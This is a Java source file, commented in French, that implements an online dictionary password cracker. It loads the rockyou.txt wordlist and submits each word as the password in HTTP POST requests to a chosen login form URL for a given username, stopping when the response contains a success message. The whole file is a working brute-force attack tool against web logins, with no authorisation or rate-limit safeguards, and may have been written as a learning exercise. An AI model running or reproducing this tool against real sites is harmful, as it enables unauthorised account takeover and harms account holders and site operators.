package com.example.passwordcracker;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

// Classe OnlineDictionaryCracker qui permet de cracker un mot de passe en utilisant une méthode de dictionnaire en ligne
public class OnlineDictionaryCracker implements DictionaryCracker {
    private static final String DICTIONARY_FILE = "D:\\PassWordCracker\\src\\main\\java\\com\\example\\passwordcracker\\rockyou.txt"; // fichier de dictionnaire
    private final String formUrl;
    private final String username;
    private final String successMessage;

    // Constructeur de la classe
    public OnlineDictionaryCracker(String formUrl, String username, String successMessage) {
        this.formUrl = formUrl;
        this.username = username;
        this.successMessage = successMessage;
    }

    @Override
    public void crack() {
        System.out.println("Commencement de la méthode de dictionnaire en ligne...");
        List<String> dictionary = loadDictionary(DICTIONARY_FILE); // charge le dictionnaire
        for (String word : dictionary) {
            if (submitFormWithPassword(word)) {
                System.out.println("Mot de passe trouvé dans le dictionnaire en ligne: " + word);
                return;
            }
        }
        System.out.println("Le mot de passe n'a pas été trouvé dans le dictionnaire en ligne.");
    }
    // méthode pour charger le dictionnaire
    private List<String> loadDictionary(String dictionaryFile) {
        List<String> dictionary = new ArrayList<>();
        try (BufferedReader br = new BufferedReader(new FileReader(dictionaryFile))) { // lecture du fichier de dictionnaire
            String line;
            while ((line = br.readLine()) != null) {
                dictionary.add(line);
            }
        } catch (Exception e) {
            // Afficher un message d'erreur en cas d'échec
            System.err.println("Erreur lors du chargement du fichier de dictionnaire.");
            e.printStackTrace();
        }
        return dictionary;
    }
    // méthode pour soumettre le formulaire avec le mot de passe
    private boolean submitFormWithPassword(String password) {
        try (CloseableHttpClient httpClient = HttpClients.createDefault()) {
            HttpPost httpPost = new HttpPost(formUrl);
            // Construire les paramètres du formulaire
            List<NameValuePair> params = new ArrayList<>();
            params.add(new BasicNameValuePair("username", username));
            params.add(new BasicNameValuePair("password", password));
            httpPost.setEntity(new UrlEncodedFormEntity(params)); // Ajouter les paramètres à la requête

            // Envoyer la requête POST
            HttpResponse response = httpClient.execute(httpPost);

            // Lire la réponse
            BufferedReader reader = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
            String line;
            StringBuilder responseContent = new StringBuilder();
            while ((line = reader.readLine()) != null) { // Lire la réponse ligne par ligne
                responseContent.append(line);
            }

            // Vérifier si la réponse contient le message de succès
            return responseContent.toString().contains(successMessage);
        } catch (Exception e) {
            e.printStackTrace(); // Afficher l'erreur
            return false; // Retourner false en cas d'échec
        }
    }
}